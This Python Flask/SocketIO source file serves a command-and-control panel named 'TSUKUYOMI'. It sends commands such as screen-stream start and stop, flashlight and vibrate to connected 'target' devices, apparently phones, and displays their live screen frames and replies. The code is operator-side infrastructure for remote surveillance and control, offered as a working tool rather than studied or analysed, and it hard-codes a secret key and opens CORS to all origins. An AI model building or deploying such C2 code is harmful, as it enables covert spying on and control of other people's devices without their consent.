# MUST BE AT THE VERY TOP BEFORE ANY OTHER IMPORTS
import eventlet
eventlet.monkey_patch()

from flask import Flask, render_template_string
from flask_socketio import SocketIO, emit

app = Flask(__name__)
app.config['SECRET_KEY'] = 'tsukuyomi_secret_key'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TSUKUYOMI // WebSocket Live Stream C2</title>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #07090e; color: #e2e8f0; font-family: 'Inter', sans-serif; }
        .glass-panel { background: rgba(18, 24, 36, 0.85); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.08); }
        .log { font-family: monospace; background: #090e17; border: 1px solid #1e293b; color: #55f0b3; padding: 12px; border-radius: 10px; height: 250px; overflow-y: auto; }
        .screen-box { width: 280px; height: 560px; background: #000; border: 6px solid #1e293b; border-radius: 24px; overflow: hidden; display: flex; align-items: center; justify-content: center; margin: auto; }
        .screen-box img { width: 100%; height: 100%; object-fit: cover; }
    </style>
</head>
<body class="p-4 md:p-8 flex flex-col items-center">
    <header class="w-full max-w-5xl glass-panel p-4 rounded-2xl mb-6 flex justify-between items-center">
        <div>
            <h1 class="font-bold text-lg text-white">TSUKUYOMI // WEBSOCKET LIVE C2</h1>
            <p class="text-xs text-slate-400">Status: <span id="connStatus" class="text-red-500 font-semibold">DISCONNECTED</span></p>
        </div>
        <div class="px-3 py-1 bg-cyan-500/10 text-cyan-400 border border-cyan-500/30 rounded-lg text-xs font-mono">MS STREAM ACTIVE</div>
    </header>

    <main class="w-full max-w-5xl grid grid-cols-1 md:grid-cols-12 gap-6">
        <div class="md:col-span-5 glass-panel p-4 rounded-2xl flex flex-col items-center space-y-4">
            <h3 class="text-xs font-bold font-mono uppercase text-slate-300">Live Screen Share (Milliseconds)</h3>
            <div class="screen-box" id="screenContainer">
                <span class="text-xs text-slate-500 text-center px-4">Waiting for live frames...</span>
            </div>
            <div class="flex gap-2 w-full">
                <button onclick="sendCmd('SCREEN_START')" class="flex-1 py-2 bg-cyan-500 text-slate-950 font-bold rounded-xl text-xs">Start Stream</button>
                <button onclick="sendCmd('SCREEN_STOP')" class="flex-1 py-2 bg-slate-800 text-slate-300 rounded-xl text-xs border border-slate-700">Stop Stream</button>
            </div>
        </div>

        <div class="md:col-span-7 glass-panel p-4 rounded-2xl flex flex-col space-y-4">
            <h3 class="text-xs font-bold font-mono uppercase text-slate-300">Real-time WebSocket Terminal</h3>
            <div class="grid grid-cols-3 gap-2">
                <button onclick="sendCmd('FLASH_ON')" class="p-2.5 bg-slate-900 border border-slate-700 rounded-xl text-xs text-amber-400">🔦 Flash ON</button>
                <button onclick="sendCmd('FLASH_OFF')" class="p-2.5 bg-slate-900 border border-slate-700 rounded-xl text-xs text-slate-300">🔦 Flash OFF</button>
                <button onclick="sendCmd('VIBRATE')" class="p-2.5 bg-slate-900 border border-slate-700 rounded-xl text-xs text-cyan-300">📳 Vibrate</button>
            </div>
            <div class="log" id="logBox">[SYSTEM] WebSocket server ready...</div>
        </div>
    </main>

    <script>
        const socket = io();

        socket.on('connect', () => {
            document.getElementById('connStatus').innerText = "CONNECTED (WS)";
            document.getElementById('connStatus').className = "text-green-400 font-semibold";
            log("WebSocket connected with zero delay.");
        });

        socket.on('screen_frame', (data) => {
            document.getElementById('screenContainer').innerHTML = `<img src="data:image/jpeg;base64,${data.frame}" alt="Live Stream">`;
        });

        socket.on('target_response', (data) => {
            log("[TARGET] " + data.response);
        });

        function sendCmd(cmd) {
            socket.emit('client_command', { command: cmd });
            log("[DISPATCHED] -> " + cmd);
        }

        function log(msg) {
            let box = document.getElementById('logBox');
            let time = new Date().toLocaleTimeString();
            box.textContent += `\\n[${time}] ${msg}`;
            box.scrollTop = box.scrollHeight;
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@socketio.on('client_command')
def handle_client_command(data):
    socketio.emit('server_command', data)

@socketio.on('target_screen_frame')
def handle_screen_frame(data):
    socketio.emit('screen_frame', data)

@socketio.on('target_response_event')
def handle_target_response(data):
    socketio.emit('target_response', data)

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000)
